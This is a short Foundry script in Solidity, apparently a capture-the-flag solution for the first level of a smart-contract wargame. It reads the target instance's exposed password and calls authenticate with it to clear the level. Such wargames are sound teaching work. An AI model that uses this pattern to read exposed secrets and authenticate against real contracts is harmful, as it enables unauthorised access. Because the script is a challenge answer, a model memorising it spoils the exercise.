// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../src/level0.sol";
import "forge-std/Script.sol";

contract POC is Script {
    Instance level0 = Instance(0xb7EDaB9083BD4596575FC781381ca27Eae5D08e9);

    function run() external {
        vm.startBroadcast();

        level0.password();
        level0.authenticate(level0.password());
        require(level0.getCleared());

        vm.stopBroadcast();
    }
}
